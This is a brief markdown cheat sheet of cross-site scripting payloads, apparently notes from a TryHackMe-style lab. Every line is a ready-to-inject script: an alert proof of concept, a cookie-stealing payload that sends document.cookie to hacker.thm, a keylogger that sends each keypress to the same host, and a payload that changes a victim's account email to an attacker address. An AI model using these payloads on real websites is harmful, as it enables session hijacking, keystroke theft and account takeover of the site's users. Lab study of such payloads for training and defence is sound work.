
#  Cross-site Scripting

- Proof Of Concept <script>alert('XSS');</script>
- Session Stealing <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
- Key Logger <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
- Business Logic <script>user.changeEmail('attacker@hacker.thm');</script>